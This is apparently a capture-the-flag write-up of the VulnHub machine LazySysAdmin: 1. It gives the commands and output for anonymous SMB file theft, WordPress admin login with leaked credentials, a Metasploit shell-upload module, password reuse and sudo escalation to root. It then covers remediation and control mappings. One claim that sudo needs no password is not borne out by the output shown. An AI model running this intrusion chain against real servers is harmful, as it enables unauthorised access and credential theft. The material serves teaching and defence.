# LazySysAdmin: 1 — When the Sysadmin Literally Leaves the Keys in the Door

Dude, this machine is called LazySysAdmin and it absolutely delivers on that promise. fr fr, this is a masterclass in what happens when someone sets up a server and just... doesn't care. Anonymous SMB access exposing WordPress source files, plaintext passwords in config files, credential reuse across three services, and an account with unrestricted sudo. Every single finding here is a real-world misconfiguration that appears in production environments on a weekly basis. This one hurts to look at from a defender's perspective.

Shoutout to Togie Mcdogie for creating this machine. The name says it all.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | LazySysAdmin: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/lazysysadmin-1,205/ |
| **Techniques** | Nmap service enumeration, SMB anonymous access, WordPress configuration file exposure, Metasploit wp_admin_shell_upload, Meterpreter post-exploitation, credential reuse, unrestricted sudo escalation |
| **CVEs** | CWE-284 (Improper Access Control: SMB anonymous), CWE-522 (Insufficiently Protected Credentials: wp-config.php in SMB share), CWE-269 (Improper Privilege Management: unrestricted sudo for togie) |
| **APT Groups** | FIN7: uses WordPress exploitation via admin credential access as primary initial access vector in retail and hospitality sector targeting; APT28: documented abuse of SMB file shares for lateral credential discovery in corporate network intrusions |

---

## Attack Summary

```
netdiscover / nmap
  → ports: 22 (SSH), 80 (HTTP WordPress), 139/445 (Samba), 3306 (MySQL)
  → smbclient -L target → share$ (anonymous, no password)
  → smbclient share$ → get deets.txt → Password: 12345
  → smbclient share$ → cd wordpress → get wp-config.php
  → wp-config.php: DB_USER=Admin, DB_PASSWORD=TogieMYSQL12345^^
  → http://target/wordpress/wp-admin → admin:TogieMYSQL12345^^
  → Metasploit: exploit/unix/webapp/wp_admin_shell_upload
  → Meterpreter shell → www-data
  → su togie (Password: 12345 from deets.txt)
  → sudo -l → (ALL:ALL) ALL
  → sudo su → uid=0(root)
  → cat /root/proof.txt
```

---

## Methodology

1. Host discovery and full port scan to identify all services
2. SMB share enumeration with anonymous access
3. File extraction: deets.txt (password hint) and wp-config.php (admin credentials)
4. WordPress admin login with extracted credentials
5. Metasploit wp_admin_shell_upload for Meterpreter session
6. Lateral movement to togie user via credential reuse
7. Sudo enumeration and unrestricted sudo escalation
8. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Target: 192.168.56.X

nmap -p- -sV 192.168.56.X
```

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1
80/tcp   open  http        Apache httpd 2.4.7 (WordPress)
139/tcp  open  netbios-ssn Samba smbd 3.x-4.x
445/tcp  open  netbios-ssn Samba smbd 3.x-4.x
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
```

Multiple services. SMB (139/445) and HTTP (80, WordPress) are the primary attack surfaces.

**Real-world note:** The presence of Samba on a web server should immediately raise a flag during any assessment. Production web servers rarely need SMB exposed. APT28 specifically targets SMB shares in corporate environments for lateral credential discovery, consistent with this machine's attack path.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SMB Anonymous Access and File Extraction

List available shares:

```bash
smbclient -L 192.168.56.X
# No password needed — press Enter
```

```
Sharename    Type    Comment
---------    ----    -------
print$       Disk    Printer Drivers
share$       Disk    Sumshare
IPC$         IPC     IPC Service
```

Connect to `share$` with no password:

```bash
smbclient '\\192.168.56.X\share$'
# Password: (empty — press Enter)
```

Enumerate and download everything:

```bash
smb: \> ls
smb: \> get deets.txt
smb: \> get todolist.txt
smb: \> cd wordpress\
smb: \> get wp-config.php
smb: \> quit
```

Read the files:

```bash
cat deets.txt
# CBF Sysadmin
# ...
# Password: 12345

cat todolist.txt
# Ignore SSL, Fix WordPress, etc.
```

**Alternative: enumerate with enum4linux or smbmap:**
```bash
enum4linux -a 192.168.56.X
smbmap -H 192.168.56.X
```

**Real-world note:** Anonymous SMB access exposing web application directories is a critical finding in every security assessment. The wp-config.php file in a Samba share is the equivalent of leaving your house keys on the front porch. Thousands of organizations still have anonymous Samba shares in their internal networks, often from legacy file-sharing setups that were never properly secured.

**MITRE ATT&CK:** T1135 — Network Share Discovery; T1039 — Data from Network Shared Drive

---

## Step 3 — Credential Extraction from wp-config.php

```bash
cat wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

Two credentials extracted:
- WordPress/MySQL admin: `Admin` / `TogieMYSQL12345^^`
- SSH/system user (from deets.txt): `togie` / `12345`

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 4 — WordPress Admin Login

Browse to `http://192.168.56.X/wordpress/wp-admin/`:
- **Username:** `admin`
- **Password:** `TogieMYSQL12345^^`

Login succeeds. Full WordPress admin access.

**MITRE ATT&CK:** T1078 — Valid Accounts: Default Accounts

---

## Step 5 — Metasploit WordPress Admin Shell Upload

With admin credentials, use Metasploit to upload a malicious plugin for shell access:

```bash
msfconsole -q
msf> use exploit/unix/webapp/wp_admin_shell_upload
msf> set RHOSTS 192.168.56.X
msf> set TARGETURI /wordpress
msf> set USERNAME admin
msf> set PASSWORD TogieMYSQL12345^^
msf> exploit
```

Meterpreter session opens as `www-data`:

```bash
meterpreter > getuid
# Server username: www-data
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
id
# uid=33(www-data) gid=33(www-data)
```

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell

---

## Step 6 — Lateral Movement to togie

The password from `deets.txt` (`12345`) works for the `togie` user account:

```bash
su togie
# Password: 12345
id
# uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),...
```

**Alternatively, SSH directly:**
```bash
ssh togie@192.168.56.X
# Password: 12345
```

**Real-world note:** Password reuse across services is one of the most consistent findings in internal penetration tests. A password found in a configuration file or text file almost always unlocks at least one additional service account. This is why credential spraying is so effective: most humans reuse passwords.

**MITRE ATT&CK:** T1078 — Valid Accounts; T1110.004 — Brute Force: Credential Stuffing

---

## Step 7 — Privilege Escalation via Unrestricted sudo

```bash
sudo -l
```

```
User togie may run the following commands on this host:
    (ALL : ALL) ALL
```

`togie` has unrestricted sudo access to everything, with no password required. Escalate directly:

```bash
sudo su
id
# uid=0(root) gid=0(root) groups=0(root)
```

Read the flag:

```bash
cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root. The lazy sysadmin sealed his own fate. gg.

**Real-world note:** Unrestricted `(ALL:ALL) ALL` sudo is the most dangerous sudo configuration possible. It means the account is functionally equivalent to root. FIN7 and multiple ransomware groups specifically enumerate `sudo -l` during post-exploitation because unrestricted sudo allows immediate privilege escalation without any exploit code.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | togie:12345 | deets.txt in SMB share | SSH and su access |
| Credential | admin:TogieMYSQL12345^^ | wp-config.php in SMB share | WordPress admin + MySQL |
| Meterpreter | www-data | Metasploit wp_admin_shell_upload | Initial web shell |
| Root shell | uid=0(root) | sudo su (unrestricted sudo) | Full system access |
| Flag | /root/proof.txt | /root/ | Proof of compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SMB anonymous access exposes web app files | Critical finding in every internal pentest; SMB shares routinely expose wp-config.php, web.config, .env files | Disable anonymous SMB; audit all share permissions; never serve web application files via SMB |
| 2 | wp-config.php contains plaintext database credentials | WordPress config files are a top credential source for attackers who gain filesystem or share access | Restrict wp-config.php permissions (0400 or 0440); place WordPress outside web root when possible |
| 3 | Password reuse across togie/admin/MySQL | Credential reuse is the #1 enabler of lateral movement in enterprise networks | Enforce unique passwords per service; use a password manager or PAM solution |
| 4 | Unrestricted sudo grants immediate root | (ALL:ALL) ALL sudo = root access; common in dev environments that accidentally became production | Apply least-privilege sudo; grant only specific, necessary commands; always require password |
| 5 | WordPress admin credentials allow RCE via plugin | Any WordPress admin can install plugins; plugin installation = OS command execution | Restrict plugin installation; implement WordPress security hardening checklist |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Collection | Network Share Discovery | T1135 |
| Initial Access | Collection | Data from Network Shared Drive | T1039 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Execution | Execution | Server Software Component: Web Shell | T1505.003 |
| Lateral Movement | Credential Access | Valid Accounts: Credential Reuse | T1078 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous SMB**: Add `map to guest = Never` in smb.conf; restrict all shares to authenticated users only
2. **Remove web application files from SMB shares**: wp-config.php and any config file must never be accessible via file shares
3. **Restrict wp-config.php permissions**: `chmod 640 /var/www/html/wordpress/wp-config.php`; ideally move it above the web root
4. **Enforce unique passwords**: Rotate all passwords; use a PAM solution or password manager; eliminate credential reuse
5. **Restrict sudo**: Grant togie only the specific commands needed; require password: `togie ALL=(root) /usr/bin/specific-command`
6. **Harden WordPress**: Restrict plugin installation to administrators; implement two-factor authentication on wp-admin

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SMB shares; audit share permissions quarterly |
| Protect | Access Control | Disable anonymous SMB; enforce authenticated access to all shares |
| Protect | Data Security | Restrict configuration file permissions; eliminate credential reuse |
| Detect | Anomalies | Alert on anonymous SMB connections; monitor sudo -l and sudo su usage |
| Respond | Response Planning | Disable anonymous SMB immediately; rotate all exposed credentials |
| Recover | Recovery Planning | Audit all SMB shares; review WordPress admin account list; rebuild if compromised |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | No anonymous SMB access; authenticated access required for all file shares |
| AC-6 | Least Privilege | togie sudo restricted to specific commands; require password |
| IA-5 | Authenticator Management | Unique passwords per service; rotate wp-config.php credentials |
| CM-7 | Least Functionality | Disable anonymous SMB; restrict WordPress plugin installation |
| SC-28 | Protection of Information at Rest | wp-config.php not accessible via network shares |

### CISA KEV

WordPress exploitation via admin credentials (wp_admin_shell_upload pattern) maps to multiple CISA KEV entries for WordPress plugins and themes with authenticated RCE. CISA BOD 23-02 addresses risk from network-exposed management interfaces including WordPress admin panels. Anonymous SMB access aligns with CISA Alert AA22-249A on misconfigured systems enabling ransomware deployment.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Identities and Credentials | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage Configuration | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable anonymous SMB; restrict wp-config.php)
- **D3-OAM** — Operating System Administrative Management (least-privilege sudo; require password)
- **D3-NTA** — Network Traffic Analysis (detect anonymous SMB connections; alert on unusual file access)

---

## Final Thoughts

LazySysAdmin is a perfect machine for demonstrating what a "defense in depth failure" looks like. Not one misconfiguration, not two: five distinct security failures, each enabling the next step. Anonymous SMB gives you credentials, credentials give you WordPress admin, WordPress admin gives you a shell, the shell gives you credential reuse, credential reuse gives you sudo, sudo gives you root. Remove any one of these and the chain breaks.

The machine is called LazySysAdmin for a reason. In the real world, this profile is shockingly common: a dev environment that became production without a security review, a config file that was meant to be temporary, a sudo rule that was "just for testing." Methodical enumeration beats clever exploits every time on machines like this.

Thanks guys!! (❍ᴥ❍ʋ)
